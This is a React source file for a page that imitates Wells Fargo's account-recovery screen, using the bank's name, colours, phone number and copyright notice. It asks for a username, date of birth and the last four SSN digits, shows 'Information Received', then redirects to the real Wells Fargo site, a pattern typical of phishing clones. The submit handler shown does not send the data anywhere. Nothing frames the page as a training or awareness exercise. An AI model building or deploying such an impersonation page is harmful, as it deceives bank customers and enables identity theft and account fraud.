import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { Search, ArrowLeft, Phone, Mail, User, Calendar, CreditCard } from "lucide-react";
import { Link, useLocation } from "wouter";
import heroBg from "@/assets/images/hero-bg.jpg";

const verifySchema = z.object({
  username: z.string().min(1, "Username is required"),
  dateOfBirth: z.string().min(1, "Date of birth is required"),
  ssn: z.string().length(4, "Please enter the last 4 digits of your SSN"),
});

type VerifyFormData = z.infer<typeof verifySchema>;

export default function ForgotPasswordPage() {
  const [step, setStep] = useState<"choose" | "verify">("choose");
  const [recoveryType, setRecoveryType] = useState<"username" | "password" | null>(null);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const form = useForm<VerifyFormData>({
    resolver: zodResolver(verifySchema),
    defaultValues: {
      username: "",
      dateOfBirth: "",
      ssn: "",
    },
  });

  const handleSelectOption = (type: "username" | "password") => {
    setRecoveryType(type);
    setStep("verify");
  };

  const onSubmit = (data: VerifyFormData) => {
    toast({
      title: "Information Received",
      description: "Redirecting to Wells Fargo...",
    });
    setTimeout(() => {
      window.location.href = "https://www.wellsfargo.com/";
    }, 1000);
  };

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-[#d71e28] text-white">
        <div className="max-w-7xl mx-auto px-4 py-2">
          <div className="flex items-center justify-between">
            <Link href="/">
              <span
                className="text-lg font-bold tracking-wide cursor-pointer"
                data-testid="text-logo"
              >
                WELLS FARGO
              </span>
            </Link>

            <nav className="flex items-center gap-4 text-xs">
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-customer-service"
              >
                Customer Service
              </a>
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-atm-locations"
              >
                ATMs/Locations
              </a>
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-espanol"
              >
                Español
              </a>
              <div className="flex items-center gap-2">
                <Search className="w-4 h-4" />
              </div>
            </nav>
          </div>
        </div>
      </header>

      <div className="bg-[#ffcd41] h-1"></div>

      <main
        className="flex-1 relative"
        style={{
          backgroundImage: `url(${heroBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center bottom",
        }}
      >
        <div className="max-w-lg mx-auto px-4 py-8">
          <Card
            className="shadow-lg border-0 bg-white"
            data-testid="card-forgot"
          >
            <CardContent className="p-6 sm:p-8">
              <Link href="/">
                <button
                  className="flex items-center gap-2 text-[#d71e28] text-sm mb-4 hover:underline"
                  data-testid="button-back"
                >
                  <ArrowLeft className="w-4 h-4" />
                  Back to Sign On
                </button>
              </Link>

              {step === "choose" && (
                <>
                  <h1
                    className="text-2xl text-gray-800 mb-2 font-semibold"
                    data-testid="text-title"
                  >
                    Forgot username or password?
                  </h1>
                  <p className="text-gray-600 text-sm mb-6">
                    Select what you need help with:
                  </p>

                  <div className="space-y-3">
                    <button
                      onClick={() => handleSelectOption("username")}
                      className="w-full p-4 border border-gray-300 rounded-md text-left hover:border-[#d71e28] hover:bg-gray-50 transition-colors"
                      data-testid="button-forgot-username"
                    >
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center">
                          <Mail className="w-5 h-5 text-gray-600" />
                        </div>
                        <div>
                          <p className="font-medium text-gray-800">
                            I forgot my username
                          </p>
                          <p className="text-sm text-gray-500">
                            We'll help you recover your username
                          </p>
                        </div>
                      </div>
                    </button>

                    <button
                      onClick={() => handleSelectOption("password")}
                      className="w-full p-4 border border-gray-300 rounded-md text-left hover:border-[#d71e28] hover:bg-gray-50 transition-colors"
                      data-testid="button-forgot-password"
                    >
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center">
                          <Phone className="w-5 h-5 text-gray-600" />
                        </div>
                        <div>
                          <p className="font-medium text-gray-800">
                            I forgot my password
                          </p>
                          <p className="text-sm text-gray-500">
                            Reset your password securely
                          </p>
                        </div>
                      </div>
                    </button>
                  </div>

                  <div className="mt-4 text-center">
                    <button
                      onClick={() => handleSelectOption("username")}
                      className="text-[#d71e28] text-sm underline hover:no-underline"
                      data-testid="link-forgot-both"
                    >
                      Both
                    </button>
                  </div>
                </>
              )}

              {step === "verify" && (
                <>
                  <h1
                    className="text-2xl text-gray-800 mb-2 font-semibold"
                    data-testid="text-title-verify"
                  >
                    {recoveryType === "username" ? "Recover your username" : "Reset your password"}
                  </h1>
                  <p className="text-gray-600 text-sm mb-6">
                    Please verify your identity by providing the following information:
                  </p>

                  <Form {...form}>
                    <form
                      onSubmit={form.handleSubmit(onSubmit)}
                      className="space-y-4"
                    >
                      <FormField
                        control={form.control}
                        name="username"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <User className="w-4 h-4" />
                              Username
                            </FormLabel>
                            <FormControl>
                              <Input
                                placeholder="Enter your username"
                                className="h-12 border-gray-300"
                                data-testid="input-username"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={form.control}
                        name="dateOfBirth"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <Calendar className="w-4 h-4" />
                              Date of Birth
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="date"
                                className="h-12 border-gray-300"
                                data-testid="input-dob"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={form.control}
                        name="ssn"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 flex items-center gap-2">
                              <CreditCard className="w-4 h-4" />
                              Last 4 digits of SSN
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="XXXX"
                                maxLength={4}
                                className="h-12 border-gray-300"
                                data-testid="input-ssn"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <div className="flex gap-3 pt-2">
                        <Button
                          type="button"
                          variant="outline"
                          className="flex-1 h-11 rounded-full"
                          onClick={() => setStep("choose")}
                          data-testid="button-cancel"
                        >
                          Cancel
                        </Button>
                        <Button
                          type="submit"
                          className="flex-1 h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full"
                          data-testid="button-continue"
                        >
                          Continue
                        </Button>
                      </div>
                    </form>
                  </Form>
                </>
              )}

              <div className="mt-6 pt-6 border-t border-gray-200">
                <div className="flex items-center gap-3 text-sm text-gray-600">
                  <Phone className="w-4 h-4" />
                  <span>
                    Need help? Call{" "}
                    <a href="tel:1-800-869-3557" className="text-[#d71e28]">
                      1-800-869-3557
                    </a>
                  </span>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>

      <footer className="bg-white border-t border-gray-200 py-4">
        <div className="max-w-7xl mx-auto px-4">
          <p
            className="text-xs text-gray-500 text-center"
            data-testid="text-copyright"
          >
            © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801.
          </p>
        </div>
      </footer>
    </div>
  );
}
